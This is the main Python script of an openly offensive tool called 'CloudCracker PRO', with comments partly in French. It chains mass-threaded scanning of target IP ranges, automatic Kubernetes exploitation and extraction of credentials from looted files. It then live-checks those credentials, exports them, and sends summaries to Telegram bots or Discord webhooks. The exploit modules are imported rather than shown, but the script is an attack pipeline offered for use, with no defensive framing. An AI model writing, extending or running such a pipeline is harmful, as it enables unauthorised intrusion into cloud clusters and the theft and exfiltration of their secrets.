#!/usr/bin/env python3
"""
CloudCracker PRO - Offensive Cloud/K8s All-in-One Cracker
Threading élevé • CLI • VPS-ready • Export • Bots
"""
import argparse
from modules.scanner import Scanner
from modules.k8s_exploit import K8sExploiter
from modules.secret_parser import SecretParser
from modules.live_checker import LiveChecker
from modules.exporter import Exporter
from modules.bot import BotSender

def parse_args():
    ap = argparse.ArgumentParser(description="CloudCracker PRO - Offensive Cloud/K8s Framework")
    ap.add_argument("-t", "--targets", required=True, help="Fichier .txt des cibles IP/CIDR/URL")
    ap.add_argument("--threads", type=int, default=1000, help="Nombre de threads (def=1000, max=5000)")
    ap.add_argument("--export", choices=["json", "csv", "sqlite"], default="json", help="Export format")
    ap.add_argument("--telegram", help="Clé API Telegram bot")
    ap.add_argument("--discord", help="Webhook Discord")
    ap.add_argument("--debug", action="store_true")
    ap.add_argument("--show-creds", action="store_true")
    return ap.parse_args()

def main():
    args = parse_args()
    with open(args.targets) as f:
        targets = [l.strip() for l in f if l.strip()]
    # 1. Scan massif
    scanner = Scanner(targets, threads=args.threads, debug=args.debug)
    scan_results = scanner.run_scan()
    # 2. Exploit K8s auto
    exploiter = K8sExploiter(scan_results, debug=args.debug)
    exploit_results = exploiter.run()
    # 3. Extraction credentials
    secret_parser = SecretParser(debug=args.debug)
    creds = []
    for host, loot in exploit_results.get("loot", {}).items():
        for fpath, content in loot.items():
            creds += secret_parser.parse(content, filename=fpath, host=host)
    # 4. Live check creds
    checker = LiveChecker(debug=args.debug)
    checked_creds = checker.check_all(creds)
    # 5. Export
    exporter = Exporter(args.export)
    export_path = exporter.export({
        "scan": scan_results, "exploit": exploit_results, "creds": checked_creds
    })
    print(f"[+] Résultats exportés dans {export_path}")
    # 6. Bots
    if args.telegram or args.discord:
        bot = BotSender(telegram_token=args.telegram, discord_webhook=args.discord)
        bot.send_summary({"scan": scan_results, "exploit": exploit_results, "creds": checked_creds}, export_path)
    # Optionnel : affichage
    if args.show_creds:
        for c in checked_creds:
            print(c)

if __name__ == "__main__":
    main()